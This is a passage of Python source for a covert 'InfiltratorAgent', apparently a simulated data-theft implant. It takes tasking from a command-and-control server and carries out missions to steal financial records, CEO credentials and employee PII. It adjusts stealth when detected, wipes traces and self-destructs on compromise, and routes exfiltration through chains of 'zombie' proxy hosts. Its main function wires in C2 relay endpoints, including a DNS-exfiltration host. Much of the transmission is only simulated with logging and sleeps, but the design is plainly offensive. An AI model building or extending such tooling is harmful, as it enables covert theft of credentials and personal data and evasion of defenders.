                "nodes_infiltrated_count": len(self.nodes_infiltrated),
                "metrics_summary": self.metrics # Send current metrics
            }
            # In a real system, this would be sent back to the sender C2 via outbound comms.
            self.logger.debug(f"[{self.agent_id}] Responding to status request: {json.dumps(status_report, indent=2)}")
            await self.intelligence_queue.put({'report_type': 'STATUS_REPORT', 'content': status_report})

        elif command_type == "SHUTDOWN":
            self.logger.warning(f"[{self.agent_id}] Received SHUTDOWN command. Initiating agent stop.")
            await self.stop()

        else:
            self.logger.warning(f"[{self.agent_id}] Unrecognized command: {command_type}")

    async def _record_threat(self, threat: ThreatDetection):
        """Records a detected threat and potentially triggers state changes."""
        self.threat_detections.append(threat)
        self.logger.error(f"[{self.agent_id}] THREAT DETECTED: {threat.threat_type} (Severity: {threat.severity.name}) - {threat.description}")

        # Update metrics
        self.metrics['detection_events'] += 1

        if threat.severity in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]:
            self.logger.critical(f"[{self.agent_id}] Critical threat detected. Initiating emergency response.")
            self.mission_status = MissionStatus.COMPROMISED # Signal mission control to handle compromise
            self.failsafe.report_status("CRITICAL_THREAT", f"Agent {self.agent_id} compromised due to {threat.threat_type}.")

    async def _adjust_tactics_for_stealth(self):
        """Adjusts agent behavior when stealth is compromised."""
        self.logger.info(f"[{self.agent_id}] Adjusting tactics for compromised stealth (Variant: {self.variant.value}).")
        # Example adjustments:
        if self.variant == InfiltratorVariant.BLACK:
            # For stealth variant, prioritize extreme caution
            self.stealth_engine.base_stealth_rate = max(0.2, self.stealth_engine.base_stealth_rate * 0.8) # Reduce base stealth to reflect compromise
            self.logger.info(f"[{self.agent_id}] Black variant: Reducing base stealth rate to {self.stealth_engine.base_stealth_rate:.2f}.")
        elif self.variant == InfiltratorVariant.RED:
            # Aggressive variant might try to quickly finish or distract
            self.stealth_engine.base_stealth_rate = max(0.1, self.stealth_engine.base_stealth_rate * 0.9)
            self.logger.info(f"[{self.agent_id}] Red variant: Attempting faster exfil with increased risk.")
        # ... add logic for GHOST, SILK variants ...

        # Universal adjustment: Pause current action
        if self.mission_status in [MissionStatus.INFILTRATING, MissionStatus.EXFILTRATING]:
            self.logger.warning(f"[{self.agent_id}] Pausing current operation to regain stealth.")
            await asyncio.sleep(random.uniform(10, 30)) # Wait longer
            self.current_target_profile = None # Re-select target with new conditions
            self.mission_status = MissionStatus.ACTIVE

    async def _handle_compromise(self):
        """Executes emergency procedures upon critical compromise."""
        self.logger.critical(f"[{self.agent_id}] Handling critical compromise!")
        self.failsafe.activate_emergency_shutdown(f"Agent {self.agent_id} detected as COMPROMISED.")

        # Emergency exfiltration attempt (minimal data, highest priority)
        if self.exfiltrated_data_size > 0:
            self.logger.info(f"[{self.agent_id}] Attempting emergency exfiltration of critical mission state.")
            emergency_data = {
                'type': 'emergency_status_report',
                'agent_id': self.agent_id,
                'last_target': self.current_target_profile.node_id if self.current_target_profile else 'N/A',
                'exfil_amount': self.exfiltrated_data_size,
                'threat_log_summary': [td.threat_type for td in self.threat_detections][-5:],
                'timestamp': datetime.now().isoformat()
            }
            emergency_record = self.exfil_core.prepare_exfiltration_package(emergency_data, "self_report")
            # For emergency, just log the event (simulate transmission)
            self.logger.info(f"[{self.agent_id}] Emergency exfiltration record: {emergency_record}")

        # Depending on variant, initiate self-destruction, data wipe, etc.
        if self.variant == InfiltratorVariant.BLACK or self.variant == InfiltratorVariant.GHOST:
            self.logger.critical(f"[{self.agent_id}] Variant {self.variant.value}: Initiating self-wipe protocols.")
            await asyncio.sleep(random.uniform(5, 10)) # Simulate wipe time
            self.logger.critical(f"[{self.agent_id}] Self-wipe complete. Agent deactivating.")
        else:
            self.logger.critical(f"[{self.agent_id}] Variant {self.variant.value}: Attempting immediate disengagement.")
            await asyncio.sleep(random.uniform(2, 5))
        # After handling, the `_mission_control_loop` will see `COMPROMISED` and then call `stop()`.

    async def _complete_mission(self):
        """Actions taken when mission objectives are successfully met."""
        self.logger.info(f"[{self.agent_id}] Mission successfully COMPLETED!")
        self.metrics['missions_completed'] += 1
        # Reward agent for mission completion (economic logic)
        self._reward_mission_complete()

        # Send final comprehensive report
        final_report_content = {
            'agent_id': self.agent_id,
            'mission_id': self.current_mission.primary_objectives[0] if self.current_mission else 'N/A',
            'status': MissionStatus.COMPLETE.value,
            'total_exfiltrated': self.exfiltrated_data_size,
            'nodes_infiltrated': list(self.nodes_infiltrated),
            'threat_summary': [asdict(td) for td in self.threat_detections],
            'metrics_at_completion': self.metrics,
            'timestamp': datetime.now().isoformat()
        }
        await self.intelligence_queue.put({'report_type': 'FINAL_MISSION_REPORT', 'content': final_report_content})
        await self._initiate_extraction()

    async def _abort_mission(self, reason: str):
        """Actions taken when a mission is aborted."""
        self.logger.warning(f"[{self.agent_id}] Mission ABORTED: {reason}.")
        self.metrics['missions_aborted'] += 1
        # Burn Root on mission failure (economic logic)
        self._burn_on_failure()

        # Send immediate abort notification
        abort_report_content = {
            'agent_id': self.agent_id,
            'mission_id': self.current_mission.primary_objectives[0] if self.current_mission else 'N/A',
            'status': MissionStatus.ABORTED.value,
            'reason': reason,
            'current_exfiltrated': self.exfiltrated_data_size,
            'threat_summary': [asdict(td) for td in self.threat_detections],
            'timestamp': datetime.now().isoformat()
        }
        await self.intelligence_queue.put({'report_type': 'MISSION_ABORT_ALERT', 'content': abort_report_content})
        await self._initiate_extraction()

    async def _initiate_extraction(self):
        """Common extraction/exit protocol."""
        self.logger.info(f"[{self.agent_id}] Initiating extraction protocol ({self.current_mission.extraction_method if self.current_mission else 'standard'})...")
        if self.current_mission and self.current_mission.extraction_method == "wipe_traces":
            self.logger.info(f"[{self.agent_id}] Executing 'wipe_traces' method.")
            await asyncio.sleep(random.uniform(5, 15)) # Simulate trace wiping
            self.logger.info(f"[{self.agent_id}] Traces wiped. Ready for deactivation.")
        elif self.current_mission and self.current_mission.extraction_method == "passive_disengage":
            self.logger.info(f"[{self.agent_id}] Performing passive disengagement.")
            await asyncio.sleep(random.uniform(2, 7)) # Simulate passive disengage
            self.logger.info(f"[{self.agent_id}] Passive disengagement complete.")
        else:
            self.logger.info(f"[{self.agent_id}] Default extraction: immediate disengage.")
            await asyncio.sleep(random.uniform(1, 3))

        self.current_mission = None # Clear mission data
        self.current_target_profile = None # Clear target
        self.exfiltration_log.clear() # Clear log for next mission
        self.exfiltrated_data_size = 0 # Reset for next mission
        self.threat_detections.clear() # Clear for next mission
        self.nodes_infiltrated.clear() # Clear for next mission

        self.mission_status = MissionStatus.EXITING # Set status to signal completion of extraction


# ============================================================================
# SHOGUN ZOMBIE TARGETING
# ============================================================================

class ZombieTargetingEngine:
    """Leverage Shogun zombie candidates for covert exfiltration paths."""
    
    @staticmethod
    def select_zombie_proxy_chain(infiltrator_agent: 'InfiltratorAgent', 
                                  zombie_candidates: List[Dict]) -> Optional[List[str]]:
        """
        Build a proxy chain using Shogun zombie candidates.
        
        Args:
            infiltrator_agent: Active InfiltratorAgent instance
            zombie_candidates: List of zombie dicts with high idle scores
        
        Returns:
            List of IPs forming a proxy chain, or None
        """
        if not zombie_candidates or len(zombie_candidates) < 2:
            return None
        
        # Sort by confidence (higher = better idle host)
        sorted_zombies = sorted(
            zombie_candidates, 
            key=lambda x: x.get("confidence", 0), 
            reverse=True
        )
        
        # Select top 2-3 highest confidence
        chain_length = min(3, len(sorted_zombies))
        proxy_chain = [z["ip"] for z in sorted_zombies[:chain_length]]
        
        logging.getLogger("ZOMBIE-TARGET").info(
            f"[{infiltrator_agent.agent_id}] Assembled proxy chain: {' -> '.join(proxy_chain)}"
        )
        
        return proxy_chain
    
    @staticmethod
    def route_exfiltration_via_zombies(infiltrator_agent: 'InfiltratorAgent',
                                      proxy_chain: List[str],
                                      data_package: Dict) -> Dict:
        """
        Wrap exfiltration data with proxy routing metadata.
        
        Args:
            infiltrator_agent: Active agent
            proxy_chain: List of zombie IPs to route through
            data_package: Original data to exfiltrate
        
        Returns:
            Enhanced data package with routing instructions
        """
        return {
            "original_data": data_package,
            "routing": {
                "proxy_chain": proxy_chain,
                "hop_count": len(proxy_chain),
                "idle_proxy_method": "IP_ID_increment_spoofing",
                "anonymization_level": "high"
            },
            "timestamp": datetime.utcnow().isoformat()
        }


# ---

async def main():
    # Configure logging for the entire application
    # This basicConfig will apply to all loggers unless overridden
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Example Usage: Create an Infiltrator Agent
    infiltrator_alpha = InfiltratorAgent(AgentID(value="ALPHA"), variant=InfiltratorVariant.BLACK, stealth_level="high")

    # Add some initial relay endpoints for exfiltration (simulating C2 configuration)
    infiltrator_alpha.exfil_core.add_relay_endpoint("https://relay.secure-datacenter.com:443")
    infiltrator_alpha.exfil_core.add_relay_endpoint("tcp://alt.cdn.network:8080")
    infiltrator_alpha.exfil_core.add_relay_endpoint("udp://backup.c2.server:53") # Example for DNS exfil

    # Define a mock mission
    mock_mission_params = MissionParameters(
        target_network="Enterprise_Core_Net",
        primary_objectives=["financial_records", "CEO_credentials"],
        secondary_objectives=["marketing_data", "employee_PII"],
        stealth_priority=9,
        time_limit=300.0,  # 5 minutes
        exfil_threshold=500 * 1024, # 500 KB of data
        risk_tolerance=0.4, # Accept up to 40% risk score
        extraction_method="wipe_traces"
    )

    # Simulate commands coming from a Command and Control (C2) server
    async def simulate_c2_commands():
        # Start the mission after a short delay
        await asyncio.sleep(2)
        logging.getLogger("C2_Simulator").info("\n--- C2: Sending START_MISSION command ---")
        await infiltrator_alpha.command_queue.put({
            "type": "START_MISSION",
            "mission_parameters": asdict(mock_mission_params)
        })

        # Request status periodically
        for i in range(1, 4):
            await asyncio.sleep(45) # Wait 45 seconds between status checks
            logging.getLogger("C2_Simulator").info(f"\n--- C2: Requesting status (Iteration {i}) ---")
            await infiltrator_alpha.command_queue.put({"type": "REQUEST_STATUS"})

        # Update relay endpoints during mission
        await asyncio.sleep(70)
        logging.getLogger("C2_Simulator").info("\n--- C2: Updating Relay Endpoints ---")
        await infiltrator_alpha.command_queue.put({
            "type": "UPDATE_RELAY_ENDPOINTS",
            "endpoints": ["https://new.stealth-relay.net:8443", "tcp://encrypted.storage.io:444"]
        })

        # Decide whether to abort or let it run
        await asyncio.sleep(mock_mission_params.time_limit / 2) # Wait halfway through the mission
        if random.random() < 0.2: # 20% chance to abort
            logging.getLogger("C2_Simulator").info("\n--- C2: Sending ABORT_MISSION command ---")
            await infiltrator_alpha.command_queue.put({"type": "ABORT_MISSION", "reason": "High risk detected by C2"})
        else:
            logging.getLogger("C2_Simulator").info("\n--- C2: Allowing mission to run to completion/timeout ---")

        # Ensure agent has time to complete its exit protocol
        await asyncio.sleep(mock_mission_params.time_limit + 30) # Sufficient time for mission and exit

        # Finally, send shutdown command
        logging.getLogger("C2_Simulator").info("\n--- C2: Sending SHUTDOWN command ---")
        await infiltrator_alpha.command_queue.put({"type": "SHUTDOWN"})


    # Run both the agent and the C2 simulation concurrently
    try:
        await asyncio.gather(
            infiltrator_alpha.run_async(), # Agent's main execution
            simulate_c2_commands() # C2 commands simulation
        )
    except asyncio.CancelledError:
        logging.info("Main simulation cancelled by external event.")
    except Exception as e:
        logging.critical(f"An unhandled error occurred in main simulation: {e}", exc_info=True)
    finally:
        # Ensure the agent stops gracefully even if something else cancels
        if infiltrator_alpha.mission_status != MissionStatus.EXITING:
            await infiltrator_alpha.stop() # Final safety stop
        logging.info("Simulation finished.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Simulation interrupted by user (Ctrl+C).")

